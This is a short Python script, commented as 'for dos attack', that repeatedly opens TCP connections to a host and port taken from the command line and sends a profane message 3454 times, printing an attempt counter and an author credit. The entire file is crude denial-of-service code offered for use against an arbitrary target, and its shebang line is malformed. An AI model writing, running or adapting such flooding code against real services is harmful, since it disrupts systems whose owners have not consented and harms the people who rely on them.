#usr/bin/env python
import socket
import sys
#this program is for dos attack
def con(host,port):
    port= int(port)
    server= socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    server.connect((host,port))
    server.send("FUCK YOU>>>>>>>>>>.......")

    server.close()
# loop program
attempts = 3454
ho=sys.argv[1]
po = sys.argv[2]
n=0


print ("Author : S.K.J ADORM")
while n< attempts:
    con(ho,po)
    print("attempts....."+ str(n))
    n=n+1
 
